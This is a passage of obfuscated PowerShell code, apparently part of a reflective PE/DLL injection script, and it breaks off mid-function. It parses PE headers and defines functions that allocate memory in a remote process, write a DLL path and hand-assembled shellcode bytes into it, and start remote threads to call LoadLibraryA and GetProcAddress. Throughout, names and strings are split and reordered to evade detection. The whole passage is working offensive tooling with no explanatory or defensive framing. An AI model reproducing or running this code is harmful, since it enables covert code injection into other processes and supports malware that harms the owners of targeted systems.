		${pEIN`FO} = &("{2}{1}{0}"-f'bject','w-O','Ne') ("{3}{0}{1}{2}" -f 'ystem.O','bjec','t','S')

		
		${nth`e`A`De`RsINFo} = &("{0}{5}{1}{2}{4}{3}" -f'Get','N','t','ders','Hea','-Image') -PEHandle ${peh`AND`Le} -Win32Types ${W`In`3`2TYpeS}

		
		${PeIn`Fo} | &("{3}{0}{2}{1}"-f'dd-M','ber','em','A') -MemberType ("{3}{2}{0}{1}" -f'ope','rty','ePr','Not') -Name ("{2}{1}{0}" -f'dle','an','PEH') -Value ${P`e`hAndLE}
		${PE`i`Nfo} | &("{1}{0}{2}"-f'b','Add-Mem','er') -MemberType ("{0}{3}{1}{2}"-f'No','pert','y','tePro') -Name ("{0}{2}{1}" -f'I','NT_HEADERS','MAGE_') -Value (${NthE`Ade`R`sI`NfO}."I`m`AGe_nt_H`ea`deRs")
		${PeI`NFO} | &("{0}{2}{1}"-f 'Add-','ber','Mem') -MemberType ("{2}{1}{3}{0}" -f 'y','tePrope','No','rt') -Name ("{1}{0}{2}"-f'eaders','NtH','Ptr') -Value (${NtHEAde`R`S`iNFO}."Nt`h`EadeR`SPTr")
		${pEIn`Fo} | &("{1}{2}{0}" -f 'mber','Add','-Me') -MemberType ("{0}{2}{1}"-f 'NotePro','y','pert') -Name ("{0}{1}{2}"-f'P','E64B','it') -Value (${n`THEA`d`eRSInfO}."Pe`64Bit")
		${P`E`iNfo} | &("{1}{0}{2}"-f '-Memb','Add','er') -MemberType ("{0}{1}{2}" -f 'NoteProp','er','ty') -Name ("{2}{0}{1}{3}"-f 'eOfIm','ag','Siz','e') -Value (${nt`Heade`Rs`inFO}."iM`A`Ge_`Nt_heA`derS"."oPt`Io`NALhE`AdeR"."sizeOf`i`M`AgE")

		if (${p`E`inFO}."pe64`BiT" -eq ${tR`Ue})
		{
			[IntPtr]${S`eCT`iO`NhEADER`pTR} = [IntPtr](&("{0}{2}{3}{1}" -f 'Add-Sign','ned','e','dIntAsUnsig') ([Int64]${Pein`FO}."nthEAD`erS`P`Tr") ( (  gCI  VaRiAbLE:gmqK ).vaLUE::"siz`EOf"([Type]${win`3`2tY`peS}."imAG`e_`Nt`_h`EadErs`64")))
			${peI`N`Fo} | &("{0}{1}{2}"-f 'A','dd-Membe','r') -MemberType ("{1}{0}{2}{3}"-f 'te','No','Pr','operty') -Name ("{0}{2}{1}"-f'Sectio','tr','nHeaderP') -Value ${SEc`T`ioNHE`ADER`pTr}
		}
		else
		{
			[IntPtr]${secTio`Nhea`D`e`Rptr} = [IntPtr](&("{2}{6}{5}{3}{0}{4}{1}"-f's','ned','Add-Si','n','ig','edIntAsU','gn') ([Int64]${PE`inFO}."NthEA`dEr`spTr") (  ${Gm`Qk}::"s`I`zEOF"([Type]${w`iN32t`ypes}."ImAg`E_`Nt`_heADERS`32")))
			${p`ei`NFO} | &("{1}{2}{0}"-f'ember','A','dd-M') -MemberType ("{2}{1}{0}" -f'Property','e','Not') -Name ("{4}{1}{2}{0}{3}" -f 'eade','ection','H','rPtr','S') -Value ${sEctio`Nh`EADE`RP`Tr}
		}

		if ((${nT`H`eADE`RSIN`FO}."im`Age_N`T_`hEADErS"."fiL`ehE`AdeR"."c`ha`RAc`TERIs`TICs" -band ${wI`N32C`O`NsTaNtS}."IM`AgE_`FIl`e_Dll") -eq ${WIN32c`onsTA`NTS}."IMAge`_f`Ile`_D`LL")
		{
			${PEi`N`FO} | &("{2}{0}{1}"-f'dd-Me','mber','A') -MemberType ("{0}{3}{1}{2}"-f'N','rop','erty','oteP') -Name ("{0}{1}{2}" -f'F','il','eType') -Value 'DLL'
		}
		elseif ((${N`THeAdeRS`i`Nfo}."iM`A`ge_NT_hE`Ad`ErS"."fil`EHE`AdEr"."cHa`R`A`CTE`RiStics" -band ${W`IN32con`STAnTs}."i`MagE_`FILe_e`XeCUT`ABL`E_ImaGE") -eq ${W`I`N32co`NSTANTs}."Ima`GE_`FiLe`_`ExeC`U`TabLe_iMage")
		{
			${P`eiN`Fo} | &("{0}{1}{2}"-f'Add','-Mem','ber') -MemberType ("{1}{2}{0}"-f'Property','No','te') -Name ("{0}{2}{1}"-f'File','ype','T') -Value 'EXE'
		}
		else
		{
			Throw ("{1}{4}{8}{2}{0}{7}{5}{6}{3}" -f' i','PE','le','DLL',' ','E','XE or ','s not an ','fi')
		}

		return ${pE`I`NfO}
	}


	Function IMpoRt-DL`LiNrEm`oT`E`P`R`o`cess
	{
		Param(
		[Parameter(poSitiOn=0, MaNDAtoRY=${T`RUE})]
		[IntPtr]
		${R`emOT`E`pRoC`haND`Le},

		[Parameter(POsItion=1, MANdATorY=${t`RUe})]
		[IntPtr]
		${imPO`R`TD`LLPA`T`HPTR}
		)

		${pT`RSize} =  ${g`MqK}::"SiZ`eOf"([Type][IntPtr])

		${IM`poRtD`LLPAtH} =   (  gET-itEm  ('vaRI'+'A'+'BLe:g'+'mQK') ).VAlue::("{3}{2}{1}{0}{4}" -f'ringAn','ToSt','tr','P','si').Invoke(${ImPor`Td`l`LPaTHP`Tr})
		${DL`l`PAtH`sIzE} = [UIntPtr][UInt64]([UInt64]${I`mp`OrTdLLpatH}."lE`NG`Th" + 1)
		${RImPortdL`lPAt`H`P`Tr} = ${wIN`3`2fUnc`TIOnS}."virtuAlA`L`LoCex"."inv`o`KE"(${remoTe`p`Ro`chaNDLe},   (  VARIabLe  U8M1sf  -vA)::"Z`ERO", ${D`L`LPAtHS`ize}, ${WIn3`2coNSt`AN`Ts}."mEM_`C`ommIt" -bor ${WIn32`c`Ons`T`AnTs}."M`Em_REsE`RVe", ${W`In32c`ONst`A`Nts}."p`Ag`E`_rEaDWrITe")
		if (${RiMPo`R`Td`llP`ATHP`Tr} -eq  ( ChiLdITEM  ('VaRiA'+'B'+'le'+':u8M1SF')).VAluE::"Ze`RO")
		{
			Throw ("{8}{9}{4}{7}{5}{3}{6}{2}{10}{0}{1}" -f 's','s','c',' remote','ry i','he',' pro','n t','Unable to allocate me','mo','e')
		}

		[UIntPtr]${NumbY`Te`sWRITt`En} =  ( vAriABLe  ("Z"+"T8xb"+"f")).VALuE::"Ze`Ro"
		${SU`CCE`ss} = ${W`in3`2`FUn`CTIOns}."Wr`It`e`pRO`cess`mEMORy"."iN`VokE"(${RemotE`PR`ocHAND`lE}, ${RI`M`PORtDllpatHp`TR}, ${iMP`or`TDL`L`PATHP`TR}, ${dLLP`ATH`siZe}, [Ref]${numbyTe`s`w`RiTten})

		if (${S`UC`CeSS} -eq ${F`AL`sE})
		{
			Throw ("{12}{9}{1}{8}{4}{6}{2}{13}{5}{11}{7}{0}{10}{3}" -f'ocess me','t',' ','ry','DLL',' rem',' path','te pr','e ','le to wri','mo','o','Unab','to')
		}
		if (${D`l`LPaThsizE} -ne ${nU`mbYt`e`SWRI`TTEn})
		{
			Throw ((("{16}{3}{17}{13}{18}{0}{14}{10}{2}{1}{6}{5}{7}{12}{15}{8}{9}{4}{11}" -f'c','DLL pat',' amount of bytes when writing a ','Gs','es','to','h ',' load to the r','r','oc','ed','s','emot',' write the ex','t','e p','Didny','t','pe')) -rEplACe([cHAR]121+[cHAR]71+[cHAR]115),[cHAR]39)
		}

		${Ke`R`NeL32hAnd`le} = ${wIn32FUNc`T`IonS}."G`etmodULeHA`Nd`LE"."I`N`VOKE"(("{3}{0}{1}{2}" -f 'r','n','el32.dll','ke'))
		${l`OadlIbR`ArYaaD`dR} = ${wIN`32Fu`N`CTIOnS}."Ge`TPrO`caddReSs"."IN`Vo`kE"(${K`e`Rn`e`l32haNdLe}, ("{1}{0}{2}" -f'rar','LoadLib','yA')) 

		[IntPtr]${dLLa`Ddr`ESS} =  (GET-variABLE  U8m1SF  ).vAlUE::"ze`Ro"
		
		
		if (${PeI`N`FO}."Pe64B`It" -eq ${tR`UE})
		{
			
			${l`OaDLi`Br`ArYa`Re`TMem} = ${W`I`N`32`FUnctIONS}."vI`R`TuaLALLOcEX"."InvO`Ke"(${ReMO`Te`pRO`CHANDLE},   ( VarIaBLe ("U8M1S"+"F")  -vaLUeonLy )::"ZE`RO", ${D`LlPAtHsI`zE}, ${WIn3`2c`OnStAn`TS}."mem_`CO`mMIT" -bor ${WI`N`32COnstAN`TS}."me`M_ReSER`VE", ${wIN3`2con`stANTS}."pA`Ge_R`ea`d`wrITE")
			if (${L`oAdLiBrarya`RETM`EM} -eq  ${U8`m1`SF}::"Ze`Ro")
			{
				Throw ("{24}{14}{19}{20}{7}{3}{13}{18}{23}{16}{17}{12}{9}{22}{8}{6}{11}{5}{10}{0}{2}{15}{1}{21}{4}"-f'e',' of Loa',' return',' alloc','aryA','r t','ce','o','o','e','h','ss fo','t','a','nabl',' value','y in the rem','o','te','e',' t','dLibr',' pr',' memor','U')
			}


			
			${lO`A`DLIb`RaRYSC1} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${loA`dL`Ibr`Ar`Ysc2} = @(0x48, 0xba)
			${loaDL`i`BRAR`y`Sc3} = @(0xff, 0xd2, 0x48, 0xba)
			${l`Oa`dLIBrarySc4} = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)

			${s`c`LeNGth} = ${l`oaDlI`B`RaRYSC1}."Le`NGth" + ${lOAd`Li`BrArYS`c2}."l`eNG`Th" + ${Lo`A`DLiBRA`RY`SC3}."L`EnGth" + ${LOad`li`B`RA`RYsc4}."l`e`NgtH" + (${PT`Rs`IzE} * 3)
			${s`CPS`meM} =   ${G`Mqk}::("{0}{2}{3}{1}" -f'Al','Global','l','ocH').Invoke(${s`cLE`N`gtH})
			${SCPSM`E`MOrIgi`N`AL} = ${Sc`PS`MEM}

			&("{0}{3}{2}{1}"-f'W','mory','BytesToMe','rite-') -Bytes ${lOaDLi`BR`A`R`ySc1} -MemoryAddress ${sCPs`M`EM}
			${sC`P`smem} = &("{0}{5}{4}{3}{2}{1}"-f 'Add-S','gned','ntAsUnsi','dI','e','ign') ${s`cPSM`EM} (${l`OadLIbr`AR`YS`c1}."LENG`Th")
			  ${gM`Qk}::("{1}{0}{3}{2}" -f'e','Structur','r','ToPt').Invoke(${R`iMPo`RT`dlLPatHptR}, ${scPS`M`em}, ${fal`sE})
			${S`CpS`MEM} = &("{1}{0}{2}{3}" -f 'd-S','Ad','ig','nedIntAsUnsigned') ${s`cp`SmEM} (${p`TR`sIZE})
			&("{1}{3}{2}{0}" -f'y','Write-By','r','tesToMemo') -Bytes ${loAdliBra`R`Y`s`C2} -MemoryAddress ${sC`Psm`em}
			${s`CpsM`em} = &("{0}{1}{3}{6}{4}{5}{2}"-f'Add-','Signed','ed','In','A','sUnsign','t') ${s`cPsMem} (${l`oAD`lI`Br`ArYsc2}."L`ENgth")
			  (ChiLDiteM  vARiabLe:GMqk ).vaLUe::("{3}{0}{1}{2}" -f 'ctureT','oP','tr','Stru').Invoke(${Lo`A`d`l`I`BrAryaaddR}, ${S`c`PsMeM}, ${f`AlsE})
			${sc`PSM`eM} = &("{3}{1}{2}{4}{0}" -f 'nsigned','d-SignedI','ntAs','Ad','U') ${SCpsm`Em} (${P`TrSIZe})
			&("{2}{1}{0}{4}{5}{3}" -f'-B','e','Writ','ory','ytes','ToMem') -Bytes ${L`O`Adlibra`RysC3} -MemoryAddress ${sCP`sM`eM}
			${sc`pS`mEM} = &("{5}{3}{6}{2}{1}{0}{4}" -f'ntAsUns','edI','n','Si','igned','Add-','g') ${s`cpS`mEm} (${Lo`ADl`ibr`ARYsC3}."LeNg`Th")
			 ( Get-ItEm  ('v'+'aRIaBL'+'E'+':gMQ'+'k')  ).VALuE::("{2}{3}{1}{0}" -f 'eToPtr','r','Str','uctu').Invoke(${lOAdli`B`RarY`ARET`M`EM}, ${Sc`p`SmEM}, ${f`Al`SE})
			${SCp`s`MEM} = &("{1}{5}{3}{4}{0}{2}" -f'ne','Add','d','e','dIntAsUnsig','-Sign') ${sCP`sMEm} (${ptRs`i`ZE})
			&("{2}{1}{5}{3}{0}{4}" -f'emo','i','Wr','BytesToM','ry','te-') -Bytes ${LO`AdlIb`Rar`YS`c4} -MemoryAddress ${SCPs`m`em}
			${scps`mem} = &("{1}{3}{5}{6}{2}{0}{4}" -f 'nsign','Ad','U','d-','ed','Signe','dIntAs') ${Sc`p`smeM} (${lOAd`L`iBr`ArYs`C4}."l`engTh")


			${rSC`Ad`dR} = ${WiN`3`2fuNctIo`Ns}."Vir`TUaLalL`oC`Ex"."iNV`o`KE"(${ReM`Ot`EpR`oC`HanDlE},   (  diR VarIaBLE:u8M1Sf  ).valuE::"Z`eRO", [UIntPtr][UInt64]${s`Cl`enGth}, ${W`In32CoNSta`N`TS}."MEm_cOM`m`it" -bor ${w`in32cO`Ns`TanTs}."MeM`_`RESe`RVE", ${W`in32`ConSTa`NtS}."p`A`G`e_exECute_Read`W`RIte")
			if (${Rs`CA`Ddr} -eq   ${U`8`M1SF}::"ze`RO")
			{
				Throw ("{12}{8}{14}{1}{11}{2}{7}{9}{13}{15}{6}{3}{10}{5}{0}{4}" -f'shel','allocate','em','rem','lcode',' ','e ','ory i','e','n ','ote process for',' m','Unabl','t',' to ','h')
			}

			${sU`Cc`eSs} = ${W`i`N`32f`UncTionS}."W`RI`TEpr`o`CESS`mEmory"."i`NVOKe"(${R`emoTepROch`A`NDle}, ${R`sc`AdDr}, ${sCp`sm`em`OrIGi`Nal}, [UIntPtr][UInt64]${scle`Ngth}, [Ref]${n`U`mby`TEsW`RITT`En})
			if ((${SUC`CeSS} -eq ${f`A`LsE}) -or ([UInt64]${N`UMb`YTE`SwrIt`TEN} -ne [UInt64]${sc`lEn`GtH}))
			{
				Throw ("{8}{1}{0}{12}{3}{7}{5}{11}{6}{4}{9}{2}{10}" -f 'abl','n','me','wr','rocess','lco',' to remote p','ite shel','U',' ','mory.','de','e to ')
			}

			${rT`HRe`AdhaN`d`LE} = &("{3}{4}{0}{2}{1}"-f 'oteThre','d','a','Cr','eate-Rem') -ProcessHandle ${r`Em`otEProCha`Ndle} -StartAddress ${rS`CaD`dr} -Win32Functions ${wi`N3`2`FuNctiOns}
			${R`Es`ULT} = ${Wi`N32`FuN`CTions}."Wa`ITF`ors`IN`G`leoBjeCT"."Invo`KE"(${R`THre`ADHaNDlE}, 20000)
			if (${reS`ULt} -ne 0)
			{
				Throw ("{5}{1}{9}{3}{10}{0}{4}{6}{8}{7}{2}"-f'eTh','l','ed.','Remo','read to cal','Cal','l ','ProcAddress fail','Get',' to Create','t')
			}

			
			[IntPtr]${rE`TuRNV`A`l`mEM} =  ${Gm`qk}::("{0}{2}{1}" -f 'All','HGlobal','oc').Invoke(${pTRs`i`ze})
			${R`E`SulT} = ${WiN3`2fuNc`TIons}."rE`ADpROcESsME`m`O`RY"."Inv`okE"(${REMO`TEPR`Oc`hA`N`dLE}, ${lOadL`iB`RARYArEt`mEM}, ${rETurnva`L`MEm}, [UIntPtr][UInt64]${Pt`RsIZE}, [Ref]${n`UmB`y`TEsWrITten})
			if (${R`eS`ULt} -eq ${F`ALse})
			{
				Throw ("{7}{1}{3}{0}{4}{2}{5}{6}" -f 'o','all to Rea','s','dPr','ce','sMemory f','ailed','C')
			}
			[IntPtr]${dll`ADdr`ess} =   ( vARIaBle  ('GM'+'QK') -vaLuEo )::"ptR`T`oSTRucTu`Re"(${R`ETurnv`Almem}, [Type][IntPtr])

			${wIn32`F`U`NCTIoNs}."V`IRTUa`LF`REeEx"."i`NvOkE"(${REMoTe`pRO`CH`AN`dlE}, ${l`o`AdlIBRarya`RetM`em}, [UIntPtr][UInt64]0, ${wi`N32co`N`ST`ANtS}."M`eM_RELe`AsE") | &("{0}{2}{1}"-f'Ou','-Null','t')
			${Win3`2fUNc`Ti`oNS}."VIrtuA`l`FreeeX"."inv`okE"(${r`Em`OTEPrO`CHa`NDLE}, ${r`sc`ADDR}, [UIntPtr][UInt64]0, ${win32c`onSt`ANtS}."meM_`Re`Lease") | &("{0}{2}{1}"-f'Out','l','-Nul')
		}
		else
		{
			[IntPtr]${r`THr`Eadh`A`NDle} = &("{3}{2}{4}{1}{5}{0}" -f'ead','teT','te-Re','Crea','mo','hr') -ProcessHandle ${re`MotE`P`RocHaN`dLe} -StartAddress ${lo`ADLI`B`RarYAaDdr} -ArgumentPtr ${R`iMp`OrtDlLpaThP`TR} -Win32Functions ${wIn32fu`Nc`TiONs}
			${reS`U`LT} = ${w`in32f`UNc`T`IONS}."wAI`T`FORs`In`GlE`objECT"."iNV`oKe"(${rThr`Ea`dHa`NdlE}, 20000)
			if (${r`ESULt} -ne 0)
			{
				Throw ("{9}{7}{5}{4}{3}{8}{0}{1}{2}{10}{6}" -f'd','dress ','fai','emoteThread to call','ateR','Cre','ed.',' ',' GetProcA','Call to','l')
			}

			[Int32]${ex`It`coDe} = 0
			${r`eSU`lt} = ${win`32FUn`CTio`Ns}."GETexItc`OD`eT`h`ReaD"."IN`V`Oke"(${rTHr`ea`DHA`NDlE}, [Ref]${ExI`TcO`DE})
			if ((${resu`lt} -eq 0) -or (${EXITc`o`De} -eq 0))
			{
				Throw ("{2}{6}{4}{0}{3}{5}{1}"-f'itCode','ad failed','Call t','T','x','hre','o GetE')
			}

			[IntPtr]${DlLaD`D`ReSs} = [IntPtr]${EX`iT`CODe}
		}

		${WI`N3`2fUNCTions}."viRTU`Alf`REeEx"."I`NVoke"(${ReMOt`eP`R`oCH`An`DlE}, ${R`I`MpOr`TDLLPAthPTr}, [UIntPtr][UInt64]0, ${WIN32`con`ST`A`NTS}."Mem`_rE`Lease") | &("{2}{0}{1}"-f'u','t-Null','O')

		return ${dl`l`AdDRe`sS}
	}


	Function GeT-`ReMOtEPro`C`A`DDRess
	{
		Param(
		[Parameter(positiOn=0, mANdaTory=${t`RUE})]
		[IntPtr]
		${Re`m`ot`eprOcH`ANdle},

		[Parameter(pOsItIon=1, maNdATORy=${t`RUE})]
		[IntPtr]
		${Re`mOte`DLlHA`N`d`le},

		[Parameter(poSiTiON=2, maNdATORY=${t`RUE})]
		[IntPtr]
		${F`UN`CTiONn`Am`Eptr},

        [Parameter(PositIoN=3, mANDaTorY=${T`RUE})]
        [Bool]
        ${l`oadBy`oR`diNal}
		)

		${pTr`sIze} =  ${g`MqK}::"SIZ`eoF"([Type][IntPtr])

		[IntPtr]${Rf`UnCNa`ME`pTR} =  (variaBLe u8M1Sf  ).VALUE::"z`ERO"   
        
        if (-not ${lOADBYo`R`d`inal})
        {
        	${F`UnC`TiO`Nname} =  (iTem variABLe:GMqK  ).ValUE::("{1}{0}{3}{4}{2}"-f'trToS','P','nsi','tri','ngA').Invoke(${fu`NctIon`NA`MEP`TR})

		    
		    ${F`Un`CtIoNnaMeS`Ize} = [UIntPtr][UInt64]([UInt64]${F`U`NctIOnNA`ME}."LENG`TH" + 1)
		    ${RFu`N`CnAMEpTR} = ${Wi`N32`FUnc`TIOnS}."vir`TUALAl`l`o`CeX"."INV`OkE"(${REM`OtEp`RoC`H`AnDLE},   (  Get-VAriablE U8m1sf  ).VALue::"Z`Ero", ${FUnC`T`iONNA`mesizE}, ${w`in32C`Ons`T`ANTs}."meM`_C`omm`it" -bor ${wi`N32`CoN`stAn`TS}."Me`m_res`erVE", ${W`in`32c`oNs`TANtS}."p`Age_RE`Adw`R`ItE")
		    if (${r`FU`NCNamE`PTr} -eq   ( Get-vARiable  U8M1SF).vaLUE::"z`ero")
		    {
			    Throw ("{8}{5}{4}{0}{1}{6}{7}{2}{3}" -f 'te me','mory ','oc','ess','o alloca','ble t','in the remo','te pr','Una')
		    }

		    [UIntPtr]${nUmBy`TESWR`I`TTEn} =   (  gCi  ('vaRIa'+'b'+'lE:zT'+'8XbF')).VALue::"ze`Ro"
		    ${sUcC`eSs} = ${Wi`N3`2`FUNCTIons}."wri`T`ePRoCEs`SMEM`oRY"."INvO`Ke"(${R`eMOTeP`Roc`haNDle}, ${rf`Unc`NaM`ePtr}, ${FUnCT`ionN`A`mEpTR}, ${fu`Nc`TIONnam`E`SIZE}, [Ref]${N`UMB`ytEswRiTT`EN})
		    if (${sUc`c`Ess} -eq ${Fal`sE})
		    {
			    Throw ("{2}{5}{7}{4}{8}{6}{1}{0}{3}{9}"-f 'remo','o ','Una','te process ',' DLL ','ble','t',' to write','path ','memory')
		    }
		    if (${FUn`CtIO`NNaMes`I`ze} -ne ${NU`M`B`YteSwriTteN})
		    {
			    Throw ((("{9}{14}{12}{5}{11}{4}{2}{13}{15}{8}{1}{17}{7}{6}{16}{3}{10}{0}" -f'ocess',' to lo','es when writin','e','t','ou',' rem','e','ath','Didn{0}t wri',' pr','nt of by','cted am','g a DLL ','te the expe','p','ot','ad to th'))  -F[CHaR]39)
		    }
        }
        
        else
        {
            ${rf`U`NCN`AMeptR} = ${fUNC`Ti`O`N`NamePTr}
        }

		
		${ke`RNEL32HA`NDle} = ${w`in32fU`N`CTIoNS}."geTMOdULEh`A`N`dle"."IN`V`Oke"(("{1}{2}{3}{0}" -f'll','ke','rnel3','2.d'))
		${GEt`PrOCa`Ddres`sa`ddR} = ${WIN32fUNCt`i`ONS}."g`etpro`cADD`R`EsS"."In`V`OkE"(${kErNEL`32`HA`N`dLe}, ("{2}{1}{0}" -f'tProcAddress','e','G')) 


		
		${getpr`O`cA`ddre`SSrE`TM`eM} = ${Win`32fuN`Cti`O`Ns}."V`irTuALaL`l`OceX"."IN`VokE"(${re`mOt`Ep`RO`CHANdlE},  (  gEt-VARIABLe u8M1sF  -vaLueO )::"Z`eRO", [UInt64][UInt64]${pT`RSi`ze}, ${w`i`N32`coNstA`Nts}."mE`M_`COmmIt" -bor ${W`IN`32Co`Ns`TanTs}."mEm`_`REs`ErVE", ${wiN3`2cONsTA`NTS}."P`AGe`_`REAdWrI`TE")
		if (${gETP`R`oCadDreS`sr`eT`mem} -eq   (itEM VaRIAbLe:U8m1sf).VaLUE::"Z`ero")
		{
			Throw ("{6}{3}{8}{9}{10}{1}{13}{12}{14}{5}{11}{4}{7}{0}{2}{15}"-f 'l','proc','ue of GetProcAddr','e me','retu',' ','Unable to allocat','rn va','mory ','in the remo','te ','the ','s f','es','or','ess')
		}


		
		
		[Byte[]]${ge`TpRocA`dDr`esSsC} = @()
		if (${PEI`NFO}."pE`64`BiT" -eq ${t`Rue})
		{
			${G`Et`procaDDr`eS`sSc1} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${g`ETProCa`DDr`E`SssC2} = @(0x48, 0xba)
			${Ge`TprOC`ADDRes`Ss`C3} = @(0x48, 0xb8)
			${GE`TP`R`oCaDdrEsS`SC4} = @(0xff, 0xd0, 0x48, 0xb9)
			${G`E`T`P`RoCaDDREssSc5} = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			${gEtPrOc`A`DD`RESssc1} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			${gEtProCADD`R`ES`Ssc2} = @(0xb9)
			${GeTPr`oc`AD`dr`eS`Ssc3} = @(0x51, 0x50, 0xb8)
			${gET`pRoca`DDr`esS`S`C4} = @(0xff, 0xd0, 0xb9)
			${getP`ROcADdr`es`sS`C5} = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		${SClE`N`GtH} = ${gETpr`o`cA`dDre`s`SsC1}."lEn`GtH" + ${geTpr`OcAd`DRes`ssC2}."L`e`NgTH" + ${GEt`PROc`ADdrES`SSC3}."L`enGth" + ${GETPrO`CA`dd`RESssc4}."Len`GTh" + ${geTProCAD`DR`eS`S`sc5}."leNg`Th" + (${p`Tr`Size} * 4)
		${scp`Sm`eM} =  ( childiteM  VAriaBLE:GMqK).ValUE::("{0}{1}{2}"-f'All','ocHGlob','al').Invoke(${S`Cl`EnGTh})
		${S`CpS`M`EMOrIgin`AL} = ${s`cpS`Mem}

		&("{1}{3}{0}{2}" -f'm','Write-Bytes','ory','ToMe') -Bytes ${GetpROCA`d`DR`EsSSC1} -MemoryAddress ${S`cpSmEM}
		${SCp`sM`EM} = &("{5}{4}{2}{6}{3}{0}{1}{7}"-f'AsU','nsig','-Signe','Int','d','Ad','d','ned') ${Sc`pSM`em} (${gEtPR`ocadd`Re`sSSC1}."lENg`TH")
		 (  LS  ("vA"+"r"+"iABLe:G"+"mqK")  ).VaLUe::("{4}{3}{0}{2}{1}"-f 'r','r','eToPt','uctu','Str').Invoke(${RE`mOte`DLlHanD`Le}, ${s`C`pSmEm}, ${FAL`SE})
		${SC`p`SmeM} = &("{4}{5}{2}{3}{1}{0}{6}" -f 'nsi','U','ig','nedIntAs','Add','-S','gned') ${sCPsm`Em} (${pT`RSI`zE})
		&("{1}{3}{0}{2}{4}" -f 'oM','Write-Bytes','e','T','mory') -Bytes ${g`eT`prO`CAddrESs`sC2} -MemoryAddress ${scp`s`Mem}
		${sc`pSm`em} = &("{5}{1}{3}{4}{2}{0}"-f'ed','-SignedInt','gn','A','sUnsi','Add') ${SC`ps`meM} (${gEtP`ROcA`D`Dr`E`SSsC2}."L`eN`gTH")
		 ${G`mQK}::("{2}{1}{3}{0}"-f 'r','ureToP','Struct','t').Invoke(${rFuN`cNAmeP`TR}, ${S`CPsM`em}, ${f`A`lSe})
		${sc`ps`meM} = &("{4}{1}{0}{3}{5}{2}" -f'I','d','Unsigned','ntA','Add-Signe','s') ${s`Cp`SMEM} (${p`Tr`siZe})
		&("{2}{0}{3}{1}" -f 'o','ry','Write-BytesT','Memo') -Bytes ${geT`pRO`cA`DdReSSsc3} -MemoryAddress ${ScpS`M`eM}
		${S`cp`sMEM} = &("{5}{6}{1}{3}{0}{2}{4}"-f 'ign','nedInt','e','AsUns','d','Add-Si','g') ${S`CPSmEM} (${GE`Tp`RocaDD`RESs`sc3}."lEN`gTh")
		 ${g`Mqk}::("{0}{2}{3}{1}"-f 'Str','tr','uc','tureToP').Invoke(${g`Et`P`R`OCA`ddreSSAD`Dr}, ${SC`ps`mEm}, ${F`ALse})
		${s`cP`SmEM} = &("{4}{0}{5}{6}{3}{2}{1}"-f'd-Si','gned','ntAsUnsi','I','Ad','gn','ed') ${S`Cp`smem} (${pT`R`sIze})
		&("{3}{2}{1}{0}{4}" -f 'tesT','y','e-B','Writ','oMemory') -Bytes ${gETprOC`ADd`R`esSsC4} -MemoryAddress ${SCpS`MeM}
		${SCPS`M`Em} = &("{0}{4}{2}{1}{5}{3}" -f'A','A','SignedInt','d','dd-','sUnsigne') ${SC`pSMEm} (${GetP`R`O`cADDrE`SS`sC4}."LEn`GtH")
		 (  get-iTem VariABlE:gMQK).VALue::("{0}{2}{3}{1}" -f'St','ureToPtr','ru','ct').Invoke(${g`EtP`ROcAddre`s`SREt`mEm}, ${ScpSm`eM}, ${fAL`SE})
		${scPS`M`em} = &("{3}{4}{1}{6}{5}{2}{0}"-f 'ed','gnedIn','n','Ad','d-Si','sUnsig','tA') ${scP`smEm} (${ptrS`i`Ze})
		&("{1}{0}{2}{3}" -f 'o','Write-BytesT','Me','mory') -Bytes ${G`ETprocAD`D`R`ESSs`c5} -MemoryAddress ${s`cPsM`eM}
		${sCP`Sm`Em} = &("{7}{6}{3}{0}{4}{2}{1}{5}"-f 'n','g','AsUnsi','d-Sig','edInt','ned','d','A') ${sc`pS`mem} (${g`etPR`OCA`ddresssC5}."lEN`GTH")

		${r`sCAddr} = ${WIN32fU`NcT`I`oNS}."VI`R`TUaLALlOc`eX"."I`NvOkE"(${REmOTe`ProCH`An`d`lE},  (vARiAbLE  ('u8m1'+'sF')).vALUe::"ZE`Ro", [UIntPtr][UInt64]${sc`LENg`TH}, ${wIN3`2C`onST`ANTS}."M`Em`_CO`MmIt" -bor ${wI`N3`2ConStANts}."Mem_`REs`ErvE", ${WI`N32COnSt`A`NtS}."PaG`E_EX`Ec`U`Te`_rE`AdwRiTE")
		if (${RsC`A`Ddr} -eq   ${u`8M1`sF}::"Ze`Ro")
		{
			Throw ("{0}{11}{4}{3}{9}{5}{1}{13}{2}{6}{7}{8}{15}{10}{12}{14}" -f 'Un','e','n the rem','e to a','bl','e m','ote p','r','o','llocat','co','a','d','mory i','e','cess for shell')
		}
		[UIntPtr]${NUm`By`TESwRIT`T`EN} =   ( vArIaBLE ZT8xbF ).Value::"ZE`RO"
		${Su`CcESs} = ${wi`N32F`UNCTi`oNs}."WRITeP`RoCEsSme`M`O`RY"."I`NVOke"(${REMOT`EpR`o`CHaNDLe}, ${R`SC`AddR}, ${s`CPSMe`m`oriGINal}, [UIntPtr][UInt64]${S`C`LEnGTh}, [Ref]${nu`M`B`YteswrITteN})
		if ((${su`ccE`ss} -eq ${FaL`Se}) -or ([UInt64]${n`UMByTEs`Wr`It`TEn} -ne [UInt64]${s`cLENG`Th}))
		{
			Throw ("{5}{8}{2}{1}{9}{6}{3}{7}{0}{4}"-f'ess',' ','le to','p',' memory.','Una',' to remote ','roc','b','write shellcode')
		}

		${r`ThRea`D`HAN`Dle} = &("{2}{0}{1}{3}" -f'Re','moteTh','Create-','read') -ProcessHandle ${REmot`Eproc`Ha`N`DLe} -StartAddress ${RS`C`ADDR} -Win32Functions ${w`IN`32Fun`cti`ONS}
		${R`Esult} = ${WiN`3`2FuNcti`Ons}."wAIT`F`O`R`sI`NglEobJeCt"."IN`V`oKE"(${rt`hR`Eadha`NDle}, 20000)
		if (${resu`LT} -ne 0)
		{
			Throw ("{4}{6}{7}{8}{9}{3}{1}{5}{0}{2}" -f 'e','cAddress fai','d.','ro','Call t','l','o C','re','ateRemoteThr','ead to call GetP')
		}

		
